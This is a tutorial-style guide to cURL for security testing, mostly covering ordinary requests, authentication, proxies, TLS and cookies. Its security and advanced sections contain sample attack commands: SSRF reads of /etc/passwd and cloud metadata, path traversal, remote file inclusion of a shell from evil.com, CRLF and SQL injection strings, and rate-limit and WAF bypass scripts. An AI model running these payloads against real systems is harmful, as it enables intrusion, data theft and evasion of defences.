# cURL: The Complete Guide for Security Testing

## Table of Contents
1. [Introduction](#introduction)
2. [Installation](#installation)
3. [Basic Usage](#basic-usage)
4. [HTTP Methods](#http-methods)
5. [Headers & Authentication](#headers--authentication)
6. [Data Transfer](#data-transfer)
7. [File Operations](#file-operations)
8. [Proxies & Tunneling](#proxies--tunneling)
9. [SSL/TLS](#ssltls)
10. [Cookies & Sessions](#cookies--sessions)
11. [Performance Testing](#performance-testing)
12. [Security Testing](#security-testing)
13. [Advanced Techniques](#advanced-techniques)
14. [Troubleshooting](#troubleshooting)
15. [Resources](#resources)

## Introduction

cURL (Client URL) is a powerful command-line tool and library for transferring data with URLs. It supports a wide range of protocols including HTTP, HTTPS, FTP, FTPS, SCP, SFTP, and more. Its versatility makes it an essential tool for developers, system administrators, and security professionals.

### Key Features
- **Protocol Support**: HTTP/HTTPS, FTP/FTPS, SCP, SFTP, LDAP, and more
- **Cross-Platform**: Available on Linux, macOS, Windows, and Unix
- **Scriptable**: Perfect for automation and testing
- **Powerful Debugging**: Detailed output options
- **Secure**: Supports SSL/TLS, client certificates, and more

## Installation

### Linux (Debian/Ubuntu)
```bash
sudo apt update && sudo apt install -y curl
```

### macOS
```bash
# Pre-installed on macOS
# To update via Homebrew:
brew install curl
```

### Windows
1. Download from [curl.se/windows](https://curl.se/windows/)
2. Or use Chocolatey: `choco install curl`
3. Or use WSL (Windows Subsystem for Linux)

### Verify Installation
```bash
curl --version
```

## Basic Usage

### Simple GET Request
```bash
curl https://example.com
```

### Save Output to File
```bash
# Save to specific filename
curl -o output.html https://example.com

# Save with remote filename
curl -O https://example.com/file.zip
```

### Follow Redirects
```bash
curl -L https://example.com
```

### Limit Transfer Rate
```bash
# Limit to 100KB/s
curl --limit-rate 100K https://example.com/largefile.zip
```

### Resume Interrupted Download
```bash
curl -C - -O https://example.com/largefile.zip
```

## HTTP Methods

### GET Request
```bash
curl -X GET https://api.example.com/users
```

### POST Request
```bash
# Form data
curl -X POST -d "username=admin&password=pass123" https://example.com/login

# JSON data
curl -X POST -H "Content-Type: application/json" \
     -d '{"username":"admin","password":"pass123"}' \
     https://api.example.com/login
```

### PUT Request
```bash
curl -X PUT -d '{"name":"New Name"}' https://api.example.com/users/1
```

### DELETE Request
```bash
curl -X DELETE https://api.example.com/users/1
```

### PATCH Request
```bash
curl -X PATCH -d '{"status":"inactive"}' https://api.example.com/users/1
```

## Headers & Authentication

### Add Headers
```bash
curl -H "Authorization: Bearer token123" \
     -H "X-Custom-Header: value" \
     https://api.example.com/data
```

### Basic Authentication
```bash
# Using -u flag
curl -u username:password https://example.com

# Or in header
curl -H "Authorization: Basic $(echo -n 'username:password' | base64)" \
     https://example.com
```

### Bearer Token
```bash
curl -H "Authorization: Bearer your_token_here" https://api.example.com/data
```

### OAuth 2.0
```bash
# Get access token
TOKEN=$(curl -X POST https://auth.example.com/oauth/token \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d 'client_id=your_client_id' \
     -d 'client_secret=your_client_secret' \
     -d 'grant_type=client_credentials' | jq -r '.access_token')

# Use access token
curl -H "Authorization: Bearer $TOKEN" https://api.example.com/data
```

## Data Transfer

### Send Form Data
```bash
# URL-encoded form
curl -d "param1=value1&param2=value2" https://example.com/form

# Multipart form data
curl -F "file=@/path/to/file" -F "name=test" https://example.com/upload
```

### Send JSON Data
```bash
# From string
curl -X POST -H "Content-Type: application/json" \
     -d '{"key":"value"}' \
     https://api.example.com/endpoint

# From file
curl -X POST -H "Content-Type: application/json" \
     -d @data.json \
     https://api.example.com/endpoint
```

### Send XML Data
```bash
curl -X POST -H "Content-Type: application/xml" \
     -d '<request><param>value</param></request>' \
     https://api.example.com/endpoint
```

## File Operations

### Upload File
```bash
# Using -F (multipart/form-data)
curl -F "file=@/path/to/file.txt" https://example.com/upload

# Using --data-binary
curl -X POST --data-binary @file.txt https://example.com/upload
```

### Download File
```bash
# Save with original filename
curl -O https://example.com/file.zip

# Save with custom filename
curl -o custom_name.zip https://example.com/file.zip

# Download multiple files
curl -O https://example.com/file1.zip -O https://example.com/file2.zip
```

### Resume Partial Download
```bash
curl -C - -O https://example.com/largefile.zip
```

## Proxies & Tunneling

### HTTP/HTTPS Proxy
```bash
# HTTP proxy
curl -x http://proxy.example.com:8080 https://example.com

# With authentication
curl -x http://username:password@proxy.example.com:8080 https://example.com
```

### SOCKS Proxy
```bash
# SOCKS4
curl --socks4 proxy.example.com:1080 https://example.com

# SOCKS5
curl --socks5 proxy.example.com:1080 https://example.com

# With authentication
curl --socks5 username:password@proxy.example.com:1080 https://example.com
```

### Tunneling through SSH
```bash
# Local port forwarding
ssh -L 8080:target.example.com:80 user@bastion.example.com

# Then use local port
curl http://localhost:8080
```

## SSL/TLS

### Ignore SSL Certificate Validation
```bash
# Not recommended for production
curl -k https://example.com
```

### Specify CA Bundle
```bash
curl --cacert /path/to/ca-bundle.crt https://example.com
```

### Client Certificate Authentication
```bash
curl --cert /path/to/client.crt --key /path/to/client.key https://example.com
```

### Check SSL Certificate
```bash
# Get certificate details
curl -vI --stderr - https://example.com | openssl x509 -noout -text

# Check expiration
curl -vI --stderr - https://example.com | openssl x509 -noout -dates
```

### SSL/TLS Version
```bash
# Force TLS 1.2
curl --tlsv1.2 https://example.com

# Force TLS 1.3
curl --tlsv1.3 https://example.com
```

## Cookies & Sessions

### Save Cookies
```bash
curl -c cookies.txt https://example.com/login
```

### Load Cookies
```bash
curl -b cookies.txt https://example.com/dashboard
```

### Session Management
```bash
# Login and save session
curl -c cookies.txt -d "username=admin&password=pass123" https://example.com/login

# Use session
curl -b cookies.txt https://example.com/private
```

### Cookie Jar
```bash
# Save all cookies to jar
curl -c cookies.jar https://example.com

# Use cookies from jar
curl -b cookies.jar https://example.com/private
```

## Performance Testing

### Measure Request Time
```bash
curl -w "\nTime: %{time_total}s\n" -o /dev/null -s https://example.com
```

### Detailed Timing Information
```bash
curl -w "\n\nTiming Details:\n\
   time_namelookup:  %{time_namelookup}s\n      time_connect:  %{time_connect}s\n   time_appconnect:  %{time_appconnect}s\n  time_pretransfer:  %{time_pretransfer}s\n     time_redirect:  %{time_redirect}s\ntime_starttransfer:  %{time_starttransfer}s\n                   ----------\n        time_total:  %{time_total}s\n" -o /dev/null -s https://example.com
```

### Multiple Parallel Requests
```bash
# Using xargs for parallel requests
echo -e "https://example.com/1\nhttps://example.com/2" | xargs -P 10 -I {} curl -s -o /dev/null -w "%{url_effective} - %{http_code}\n" {}
```

## Security Testing

### HTTP Method Testing
```bash
# Test different HTTP methods
for method in GET POST PUT DELETE PATCH OPTIONS; do
    echo "$method:"
    curl -X $method -I https://example.com/api/resource
    echo "-------------------"
done
```

### Header Injection Testing
```bash
# Test for CRLF injection
curl -v "https://example.com/%0D%0ASet-Cookie:injected=1"

# Test for HTTP header injection
curl -H "X-Forwarded-For: 127.0.0.1" -H "X-Original-URL: /admin" https://example.com
```

### Open Redirect Testing
```bash
# Test for open redirects
curl -v "https://example.com/redirect?url=http://evil.com"
```

### SSRF Testing
```bash
# Test for SSRF
curl -v "http://example.com/fetch?url=file:///etc/passwd"
curl -v "http://example.com/fetch?url=http://169.254.169.254/latest/meta-data/"
```

### File Inclusion Testing
```bash
# Test for LFI/RFI
curl -v "http://example.com/page.php?file=../../../../etc/passwd"
curl -v "http://example.com/page.php?file=http://evil.com/shell.php"
```

### API Fuzzing
```bash
# Simple parameter fuzzing
for i in {1..100}; do
    curl -s -o /dev/null -w "%{http_code} " "https://api.example.com/user/$i"
done
```

## Advanced Techniques

### WebSocket Connection
```bash
# Using --include to see headers
curl --include --no-buffer \
     --header "Connection: Upgrade" \
     --header "Upgrade: websocket" \
     --header "Sec-WebSocket-Key: SGVsbG8sIHdvcmxkIQ==" \
     --header "Sec-WebSocket-Version: 13" \
     http://example.com/ws
```

### HTTP/2 Request
```bash
# Requires curl with HTTP/2 support
curl --http2 https://example.com
```

### Rate Limiting Bypass
```bash
# Rotate user agents and delays
USER_AGENTS=(
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15"
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
)

for i in {1..100}; do
    UA="${USER_AGENTS[$RANDOM % ${#USER_AGENTS[@]}]}"
    curl -A "$UA" -s -o /dev/null -w "Request $i - Status: %{http_code}\\n" "https://example.com/api/endpoint"
    sleep $((RANDOM % 5 + 1))
done
```

### Bypass WAF/ModSecurity
```bash
# Obfuscate request
curl -H "X-Forwarded-For: 1.2.3.4" \
     -H "X-Originating-IP: 1.2.3.4" \
     -H "X-Remote-IP: 1.2.3.4" \
     -H "X-Remote-Addr: 1.2.3.4" \
     -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36" \
     -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" \
     -H "Accept-Language: en-US,en;q=0.5" \
     -H "Accept-Encoding: gzip, deflate, br" \
     -H "Connection: keep-alive" \
     -H "Upgrade-Insecure-Requests: 1" \
     -H "Cache-Control: max-age=0" \
     -H "TE: Trailers" \
     "https://example.com/vulnerable/endpoint?param=1' OR '1'='1"
```

## Troubleshooting

### Verbose Output
```bash
# Show detailed request/response
curl -v https://example.com

# Show only response headers
curl -I https://example.com

# Show request headers
curl -v -o /dev/null https://example.com
```

### Debug SSL/TLS Issues
```bash
# Show SSL/TLS handshake details
curl -v --trace-ascii /dev/stdout --tlsv1.2 https://example.com

# Check supported ciphers
openssl ciphers -v | while read c; do
    if curl -s -S --ciphers "$c" https://example.com >/dev/null 2>&1; then
        echo "$c"
    fi
done
```

### Connection Issues
```bash
# Resolve DNS manually and connect by IP
IP=$(dig +short example.com | head -1)
curl --resolve example.com:443:$IP https://example.com

# Force IPv4 or IPv6
curl -4 https://example.com  # IPv4 only
curl -6 https://example.com  # IPv6 only
```

## Resources

### Official Documentation
- [cURL Official Website](https://curl.se/)
- [cURL Man Page](https://curl.se/docs/manpage.html)
- [cURL Book](https://everything.curl.dev/)

### Cheat Sheets
- [cURL Cheat Sheet](https://devhints.io/curl)
- [HTTPie vs cURL](https://httpie.io/docs/cli/curl-compared)

### Security References
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)

### Community
- [Stack Overflow](https://stackoverflow.com/questions/tagged/curl)
- [GitHub Issues](https://github.com/curl/curl/issues)
